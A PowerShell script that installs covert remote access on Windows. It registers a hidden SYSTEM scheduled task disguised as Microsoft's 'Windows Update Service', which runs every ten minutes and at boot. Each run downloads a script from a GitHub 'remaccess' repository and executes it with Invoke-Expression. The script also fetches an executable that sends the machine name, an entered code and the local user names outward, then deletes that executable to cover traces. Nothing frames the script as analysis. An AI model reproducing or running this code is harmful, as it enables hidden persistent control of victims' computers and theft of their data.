$regPath = "HKLM:\Software\WindowsUpdateService"
$userNames = ($userProfiles | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join "|"
$code = Read-Host "Enter the code"
$name = Read-Host "Type in the Name of the PC"
$shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
$exePath = Join-Path $exeFolder "DiscordDataUpload.exe"
$userProfiles = Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false }
$messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force
}
Set-ItemProperty -Path $regPath -Name "Code" -Value $code
Set-ItemProperty -Path $regPath -Name "Data" -Value active
$homeDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$exeFolder = Join-Path $homeDirectory "DiscordDataUpload"
if (-not (Test-Path $exeFolder)) {
    New-Item -Path $exeFolder -ItemType Directory
}
#Install WindowsUpdateService
$scriptContent = @'
$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
$response = Invoke-WebRequest -Uri $url -UseBasicParsing
if ($response.StatusCode -eq 200) {
    $scriptContent = $response.Content
    Invoke-Expression $scriptContent
} else {}
'@
Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
$scriptContent | Set-Content -Path $shellscriptpath -Force
#Install Windows Service
$updateservxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>Microsoft\System</Author>
    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
    <URI>\Windows Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </RegistrationTrigger>
    <BootTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT15M</Delay>
    </BootTrigger>
    <EventTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT10M</Interval>
      <Count>10</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateService.ps1"</Arguments>
      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
$updateserv = "Windows Update Service"
if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
    # Task exists, so delete it
    Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
    Write-Host "Task '$updateserv' deleted."
} else {}
Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
Start-ScheduledTask -TaskName $updateserv
#Temporary secion for remoaval of rudimentroy file and tasks
$daemonserv = "Windows Update Service Daemon"
if (Get-ScheduledTask -TaskName $daemonserv -ErrorAction SilentlyContinue) {
    # Task exists, so delete it
    Unregister-ScheduledTask -TaskName $daemonserv -Confirm:$false
    Write-Host "Task '$daemonserv' deleted."
} else {}
#DataUpload
Invoke-WebRequest -Uri $messageboturl -OutFile $exePath
Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $code
Start-Sleep 2
Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $name
Start-Sleep 2
Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $userNames
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
# Removal of directories
$ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
foreach ($file in $ps1Files) {
    if (Test-Path $file -PathType Leaf) {
        Remove-Item -Path $file -Force
        Write-Host "File $file removed."
    } else {
        Write-Host "File $file does not exist."
    }
}

